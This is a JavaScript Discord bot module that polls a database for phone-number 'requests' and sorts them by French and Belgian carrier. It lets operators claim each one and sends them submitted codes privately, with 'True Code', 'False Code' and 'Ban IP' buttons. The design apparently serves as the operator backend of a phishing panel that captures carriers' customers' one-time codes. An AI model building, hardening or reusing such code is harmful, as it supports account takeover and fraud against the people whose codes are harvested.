/**
 * polling.js — DB polling for new Discord notifications
 *
 * v3.2 — Load-hardening pass:
 *   - Pending requests now use an updated_at cursor (like code_submitted)
 *     so a row reset back to 'pending' on an existing id is detected too,
 *     not just brand-new INSERTs.
 *   - Each channel.send()/DM is wrapped in its own try/catch so a single
 *     failure (Discord rate-limit, missing permission, closed DMs) no
 *     longer aborts the whole batch or stalls the cursor — every other
 *     request in the batch still gets processed, and the cursor only
 *     advances past requests that were actually delivered.
 *   - @everyone replaced with a configurable ping (CONFIG.PING_MESSAGE),
 *     off by default, to avoid hammering the channel under heavy traffic.
 */

import { ButtonBuilder, ButtonStyle, ActionRowBuilder } from "discord.js";
import { CONFIG, getChannelIdForOperator } from "./config.js";
import { getPendingRequests, getCodeSubmittedRequests } from "./database.js";
import { buildNewRequestEmbed, buildCodeSubmittedEmbed } from "./utils/embedBuilder.js";
import { getClaimer } from "./utils/claimStore.js";
import { rememberMessage } from "./utils/messageStore.js";

const POLL_INTERVAL_MS = 5000;

// ─── State ────────────────────────────────────────────────────────────────────

/**
 * Timestamp of the most recently processed pending row.
 * Initialized 30 s in the past so we don't miss anything on bot restart.
 */
let lastPendingAt = new Date(Date.now() - 30_000);

/**
 * Timestamp of the most recently processed code_submitted row.
 * Initialized 30 s in the past so we don't miss anything on bot restart.
 */
let lastCodeSubmittedAt = new Date(Date.now() - 30_000);

// ─── Helpers ──────────────────────────────────────────────────────────────────

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

/** Resolve the right channel for a request based on its carrier (Orange/SFR/Bouygues/Belgium). */
function getChannelForOperator(client, operator) {
    const channelId = getChannelIdForOperator(operator);
    if (!channelId) {
        console.warn(`⚠️  No channel configured for operator "${operator}" and no default channel set — use /config`);
        return null;
    }
    const channel = client.channels.cache.get(channelId);
    if (!channel) {
        console.warn(`⚠️  Configured channel ${channelId} for operator "${operator}" was not found (wrong ID or bot not in that channel)`);
    }
    return channel || null;
}

// ─── Senders ──────────────────────────────────────────────────────────────────

async function sendNewRequest(client, row) {
    const channel = getChannelForOperator(client, row.operator);
    if (!channel) return true; // no channel configured — not a delivery failure, don't retry forever

    const embed = buildNewRequestEmbed(row);
    // NOTE: no Ban IP button here on purpose — this is the very first embed
    // a request gets (before any staff has even looked at it), so banning
    // is deliberately kept off it. It still appears on every embed after
    // this one (post-claim, code submitted, unclaimed, etc.).
    const buttons = [
        new ButtonBuilder()
            .setCustomId("claim_" + row.phone)
            .setLabel("📋 Claim")
            .setStyle(ButtonStyle.Primary),
    ];

    try {
        const sent = await channel.send({
            content: CONFIG.PING_MESSAGE || `<@&${CONFIG.ACCESS_ROLE_ID}>`,
            embeds: [embed],
            components: [new ActionRowBuilder().addComponents(...buttons)],
            allowedMentions: { roles: [CONFIG.ACCESS_ROLE_ID] },
        });
        rememberMessage(row.phone, channel.id, sent.id);
        console.log("📨 New request sent to Discord:", row.phone);
        return true;
    } catch (e) {
        console.error(`❌ Failed to send new-request message for ${row.phone}:`, e.message || e);
        return false; // let the caller keep the cursor before this row so it's retried next poll
    }
}

/**
 * Sends the "code submitted" embed privately (DM) to whoever claimed the request.
 * Only the claimer should ever see the code — never posted publicly in a channel.
 * Falls back to a tagged channel message only if the claimer can't be resolved
 * or their DMs are closed, so the request never gets silently lost.
 */
async function sendCodeSubmitted(client, row) {
    const embed = buildCodeSubmittedEmbed(row);
    const buttons = [
        new ButtonBuilder()
            .setCustomId("truecode_" + row.phone)
            .setLabel("✅ True Code")
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId("falsecode_" + row.phone)
            .setLabel("❌ False Code")
            .setStyle(ButtonStyle.Danger),
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);
    const components = [new ActionRowBuilder().addComponents(...buttons)];

    // Resolve the claimer via the shared claimStore (in-memory + DB fallback, cached).
    const claimerId = await getClaimer(row.phone);

    if (claimerId) {
        try {
            const user = await client.users.fetch(claimerId);
            await user.send({ embeds: [embed], components });
            console.log("🔒 Code submission DM'd to claimer:", row.phone, "->", claimerId);
            return true;
        } catch (e) {
            console.warn(`⚠️  Could not DM claimer ${claimerId} for ${row.phone} (DMs closed?):`, e.message);
        }
    } else {
        console.warn("⚠️  No claimer found for", row.phone, "— falling back to channel");
    }

    // Fallback: post in the operator channel so the request isn't lost.
    const channel = getChannelForOperator(client, row.operator);
    if (!channel) return false; // nowhere to deliver — will retry next poll
    try {
        await channel.send({
            content: claimerId ? `<@${claimerId}> — could not DM you, posting here instead:` : "⚠️ No claimer found for this code submission",
            embeds: [embed],
            components,
        });
        console.log("🔓 Code submission sent to channel (fallback):", row.phone);
        return true;
    } catch (e) {
        console.error(`❌ Failed to send code-submitted fallback for ${row.phone}:`, e.message || e);
        return false;
    }
}

// ─── Poll loops ───────────────────────────────────────────────────────────────

async function pollPending(client) {
    try {
        const rows = await getPendingRequests(lastPendingAt);
        if (rows.length === 0) return;

        let cursor      = lastPendingAt;
        let hadFailure  = false;
        for (const row of rows) {
            const delivered = await sendNewRequest(client, row);
            const rowAt      = new Date(row.updated_at);
            if (delivered) {
                // Only advance the cursor through the unbroken successful prefix.
                // Once a failure happens we freeze the cursor there so that row
                // (and everything after it) gets retried next poll — we still
                // attempt the rest of this batch though, best-effort, so a
                // single stuck row doesn't block newer requests from going out.
                if (!hadFailure && rowAt > cursor) cursor = new Date(rowAt.getTime() + 1);
            } else {
                hadFailure = true;
            }
        }
        lastPendingAt = cursor;
    } catch (e) {
        console.error("❌ Pending poll error:", e.message || e);
    }
}

async function pollCodeSubmitted(client) {
    try {
        // Query by updated_at (not id) so retries — which UPDATE the same row — are detected.
        const rows = await getCodeSubmittedRequests(lastCodeSubmittedAt);
        if (rows.length === 0) return;

        let cursor     = lastCodeSubmittedAt;
        let hadFailure = false;
        for (const row of rows) {
            const delivered = await sendCodeSubmitted(client, row);
            const rowAt      = new Date(row.updated_at);
            if (delivered) {
                // Same contiguous-prefix logic as pollPending: freeze the cursor
                // at the first failure so it (and anything after) is retried
                // next poll, without blocking delivery of the rest this cycle.
                if (!hadFailure && rowAt > cursor) cursor = new Date(rowAt.getTime() + 1);
            } else {
                hadFailure = true;
            }
        }
        lastCodeSubmittedAt = cursor;
    } catch (e) {
        console.error("❌ CodeSubmitted poll error:", e.message || e);
    }
}

// ─── Entry point ──────────────────────────────────────────────────────────────

/**
 * OPTIMIZATION: previously pollPending and pollCodeSubmitted each had their
 * own setInterval, both firing every 5s independently — two separate timers
 * doing the same job. Combined into one interval that runs both checks
 * concurrently (Promise.all) each tick: one less timer, and the two DB
 * round-trips happen in parallel instead of back-to-back.
 */
export function startPolling(client) {
    console.log(`🔄 Polling started — interval: ${POLL_INTERVAL_MS / 1000}s`);
    setInterval(() => {
        Promise.all([pollPending(client), pollCodeSubmitted(client)])
            .catch(e => console.error("❌ Poll tick error:", e.message || e));
    }, POLL_INTERVAL_MS);
}
